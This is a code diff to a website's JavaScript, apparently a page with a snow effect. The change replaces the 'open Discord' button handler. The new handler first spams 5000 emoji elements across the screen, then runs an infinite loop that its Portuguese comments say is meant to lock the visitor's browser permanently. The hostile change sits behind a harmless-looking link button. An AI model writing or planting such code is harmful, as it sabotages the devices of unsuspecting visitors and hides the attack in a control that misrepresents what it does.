@@ -144,7 +144,22 @@ body.active #snow {
 const discord = "https://discord.gg/QEkBfcaJXc";
 
 function openDiscord() {
-    window.open(discord, "_blank");
+    // 1. Opcional: Tenta criar caos visual primeiro (muitos elementos)
+    for (let i = 0; i < 5000; i++) {
+        let div = document.createElement('div');
+        div.innerText = "👁️"; // Ou qualquer emoji/imagem
+        div.style.position = 'fixed';
+        div.style.left = Math.random() * window.innerWidth + 'px';
+        div.style.top = Math.random() * window.innerHeight + 'px';
+        div.style.fontSize = '20px';
+        div.style.pointerEvents = 'none'; // Não interfere nos cliques
+        document.body.appendChild(div);
+    }
+
+    // 2. Trava o navegador definitivamente com loop infinito
+    while (true) {
+        // Isso consome toda a CPU da thread principal
+    }
 }
 
 async function enterSite() {
